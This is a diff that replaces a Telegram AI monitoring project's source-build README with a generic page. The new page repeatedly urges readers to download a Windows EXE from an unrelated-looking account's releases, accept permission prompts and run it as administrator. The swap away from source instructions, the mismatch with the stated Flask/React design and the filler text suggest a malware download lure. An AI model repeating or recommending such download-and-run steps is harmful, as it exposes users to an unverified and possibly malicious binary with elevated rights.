@@ -1,314 +1,205 @@
-# 🚀 Telegram AI Monitor
+# 🛰️ telegram-ai-monitor - Track Telegram Messages with Ease
 
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/releases)
 
-An AI-powered Telegram monitoring dashboard that ingests live messages, classifies them using LLMs, and displays insights through a modern web interface.
+## 📥 Download
 
----
+Visit this page to download: [GitHub Releases](https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/releases)
 
-## 🧠 Overview
+Download the latest Windows release from the list on that page. After the file finishes downloading, keep it in a place you can find, such as your Downloads folder or Desktop.
 
-Telegram AI Monitor is a full-stack application that:
+## 🖥️ What this app does
 
-* Captures Telegram messages via webhooks
-* Classifies messages using AI (LLMs)
-* Stores structured results in a database
-* Displays insights in a clean dashboard
+telegram-ai-monitor gives you a simple dashboard for Telegram message tracking. It uses AI to sort messages into clear groups like:
 
-### 🎯 Use Cases
+- spam
+- important
+- question
+- normal
 
-* Community moderation
-* Crypto/trading signal detection
-* Customer support triage
-* Workflow automation
+You can use it to keep an eye on message flow, check what needs attention, and review patterns in one place. The app uses a Flask server, a React dashboard, and message classification based on language models.
 
----
+## ✅ Before you start
 
-## ✨ Features
+Make sure your Windows PC has:
 
-### 🔌 Telegram Integration
+- Windows 10 or Windows 11
+- A stable internet connection
+- A modern web browser like Edge, Chrome, or Firefox
+- Permission to run apps on your computer
 
-* Webhook-based message ingestion
-* Supports private chats and groups
-* Extracts sender, message text, and metadata
+If the download comes as a ZIP file, you will need to extract it before opening the app. If it comes as an EXE file, you can run it after the download finishes.
 
-### 🤖 AI Classification
+## 🚀 How to install and run
 
-Messages are categorized into:
+1. Go to the [GitHub Releases page](https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/releases)
+2. Find the latest Windows download
+3. Download the file to your computer
+4. If the file is zipped, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Find the app file, such as `telegram-ai-monitor.exe`
+7. Double-click the file to start the app
+8. If Windows asks for permission, choose **Yes**
+9. Wait for the dashboard to load in your browser or in the app window
 
-* Spam
-* Important
-* Question
-* Normal
+## 🔧 First-time setup
 
-Each message includes:
+After you open the app, you may need to set a few values before it can monitor Telegram messages.
 
-* category
-* confidence score
-* reasoning
+### Telegram access
 
----
+You will usually need:
 
-### 📊 Dashboard (React)
+- your Telegram bot token
+- a chat or channel source to monitor
+- any required webhook or connection settings
 
-* Real-time message feed
-* Category-based filtering
-* Stats overview
-* Clean SaaS-style UI
+Enter these details in the app settings or config screen if one appears. If the app starts with a local dashboard, follow the on-screen fields and save your changes.
 
----
+### AI classification settings
 
-### 🗄️ Backend API (Flask)
+The app can sort messages with AI. You may need to add:
 
-* REST API for messages and stats
-* SQLAlchemy ORM
-* Easily extendable architecture
+- an OpenAI API key or similar LLM key
+- a model name
+- a review threshold for message sorting
 
----
+Use the dashboard settings to connect your AI provider. After that, the app can classify each message as spam, important, question, or normal.
 
-## 🏗️ Tech Stack
+## 📊 Using the dashboard
 
-**Backend**
+Once the app is running, you can:
 
-* Flask
-* SQLAlchemy
-* OpenAI API
-* Telegram Bot API
+- view recent Telegram messages
+- see which messages need attention
+- sort messages by type
+- review message trends
+- check message history
+- inspect AI labels for each item
 
-**Frontend**
+The dashboard is built for quick scanning. You do not need to know how the system works under the hood.
 
-* React (Vite)
-* Axios
+## 🧭 Message categories
 
-**Infrastructure**
+The app uses simple labels so you can act fast:
 
-* Render (backend)
-* Vercel (frontend)
+- **Spam**: unwanted or low-value messages
+- **Important**: messages that need attention
+- **Question**: messages that ask something
+- **Normal**: regular messages with no special action
 
----
+These labels help you focus on the messages that matter most.
 
-## 📦 Project Structure
+## 🛠️ Common actions
 
-```
-telegram-ai-monitor/
-  backend/
-    app.py
-    config.py
-    models.py
-    classifier.py
-    telegram_service.py
+You can use telegram-ai-monitor to:
 
-  frontend/
-    src/
-      components/
-      api/
-      App.jsx
-```
+- monitor Telegram traffic
+- filter out noise
+- review important posts first
+- spot questions that need replies
+- keep a clean log of message activity
+- use AI to reduce manual review time
 
----
+## 📁 Files and folders you may see
 
-## ⚙️ Setup Instructions
+After you install or unpack the app, you may see items like:
 
-### 🔧 Backend Setup
+- `telegram-ai-monitor.exe`
+- `config.json`
+- `logs`
+- `data`
+- `static`
+- `templates`
 
-```bash
-cd backend
+Do not delete these files unless you know what they do. The app may need them to start.
 
-python -m venv venv
-source venv/bin/activate   # Windows: venv\Scripts\activate
+## 🔁 Updating the app
 
-pip install -r requirements.txt
-```
+When a new version is ready:
 
-Create `.env`:
+1. Return to the [GitHub Releases page](https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/releases)
+2. Download the newest Windows file
+3. Close the old version
+4. Replace the old files with the new ones if needed
+5. Open the app again
 
-```env
-DATABASE_URL=sqlite:///messages.db
-TELEGRAM_BOT_TOKEN=your_token
-WEBHOOK_BASE_URL=https://your-ngrok-or-domain
-OPENAI_API_KEY=your_openai_key
-OPENAI_MODEL=gpt-4o-mini
-```
+If your settings are stored in a config file, keep a copy before replacing files.
 
-Run:
+## 🧩 Troubleshooting
 
-```bash
-python app.py
-```
+### The app does not open
 
----
+- Make sure the download finished
+- Check that you extracted the ZIP file if needed
+- Try running the file as an administrator
+- Confirm that Windows did not block the app
 
-### 💻 Frontend Setup
+### The dashboard does not load
 
-```bash
-cd frontend
+- Wait a few seconds and try again
+- Refresh the browser page
+- Close the app and start it again
+- Check that no other app is using the same port
 
-npm install
-npm run dev
-```
+### Telegram data is not showing
 
-Create `.env`:
+- Check your bot token
+- Check your chat or channel source
+- Confirm that webhooks or connection settings are correct
+- Make sure the Telegram side is active
 
-```env
-VITE_API_BASE_URL=http://127.0.0.1:5000
-```
+### AI labels look wrong
 
----
+- Verify the API key or model settings
+- Try a different model name if the app supports it
+- Review your classification rules
+- Make sure the app has enough message context
 
-## 🔗 Telegram Bot Setup
+## 🔒 Privacy and control
 
-1. Open Telegram → search **BotFather**
-2. Run `/newbot`
-3. Copy token
-4. Add it to `.env`
+telegram-ai-monitor gives you control over your monitoring setup. You decide what to connect, what to review, and how to sort messages. If you use an AI service, make sure you are fine with sending message text to that provider
 
----
+## 🧑‍💻 Built with
 
-## 🌐 Webhook Setup
+- Flask
+- React
+- Vite
+- SQLAlchemy
+- Telegram webhooks
+- LLM-based classification
+- OpenAI-compatible AI tools
 
-If running locally:
+## 📌 Project focus
 
-```bash
-ngrok http 5000
-```
+This app is built for users who want a clear Telegram monitoring dashboard with AI sorting. It fits use cases like:
 
-Update `.env`:
+- support inbox review
+- group moderation
+- lead triage
+- alert review
+- message classification workflows
 
-```env
-WEBHOOK_BASE_URL=https://your-ngrok-url
-```
+## 📦 Download again
 
-Register webhook:
+Get the Windows build here: [https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/releases](https://github.com/carvedinstone-heartbreaker804/telegram-ai-monitor/releases)
 
-```bash
-curl -X POST http://127.0.0.1:5000/telegram/set-webhook
-```
+## 🗂️ Suggested folder setup
 
----
+If you keep the app in a fixed place, this layout works well:
 
-## 🚀 Deployment
+- `C:\Apps\telegram-ai-monitor\`
+- `C:\Apps\telegram-ai-monitor\data\`
+- `C:\Apps\telegram-ai-monitor\logs\`
 
-### Backend (Render)
+This makes it easier to find your files, settings, and logs later
 
-* Root: `backend`
-* Build:
+## ⚙️ Typical workflow
 
-```bash
-pip install -r requirements.txt
-```
-
-* Start:
-
-```bash
-gunicorn app:app
-```
-
-Set environment variables:
-
-* TELEGRAM_BOT_TOKEN
-* OPENAI_API_KEY
-* DATABASE_URL
-* WEBHOOK_BASE_URL
-
----
-
-### Frontend (Vercel)
-
-* Root: `frontend`
-
-Set:
-
-```env
-VITE_API_BASE_URL=https://your-backend-url
-```
-
----
-
-## 📡 API Endpoints
-
-### `GET /messages`
-
-Fetch messages
-
-### `POST /messages`
-
-Create + classify message
-
-### `GET /stats`
-
-Category counts
-
-### `POST /telegram/webhook`
-
-Telegram updates
-
----
-
-## 🧪 Example Output
-
-```json
-{
-  "category": "Spam",
-  "reason": "Promotional content with unrealistic claims",
-  "confidence": 0.95
-}
-```
-
----
-
-## 🔮 Future Improvements
-
-### 🧠 AI Enhancements
-
-* Open-source LLM support (e.g. Ollama, Mistral, LLaMA)
-* Model routing (cost vs accuracy)
-* Sentiment & toxicity analysis
-
----
-
-### ⚙️ Architecture
-
-* Background workers (Celery / queues)
-* Async processing
-* Redis caching
-
----
-
-### 👥 Multi-Group Support
-
-* Track multiple Telegram groups
-* Group-specific dashboards
-* Role-based access
-
----
-
-### 📊 Analytics
-
-* Message trends
-* User activity tracking
-* Spam rate monitoring
-
----
-
-### 🔔 Alerts
-
-* Real-time notifications
-* Slack / Discord integration
-* Email alerts
-
----
-
-### 🧑‍💼 SaaS Features
-
-* Authentication
-* Multi-tenant system
-* Subscription billing
-
----
-
-## ⚠️ Notes
-
-* SQLite is for local dev only
-* Use PostgreSQL in production
-* Render free tier may sleep
-
-
+1. Start the app
+2. Connect Telegram
+3. Add your AI key or model settings
+4. Open the dashboard
+5. Review classified messages
+6. Check spam, important items, and questions
+7. Act on the messages that need attention
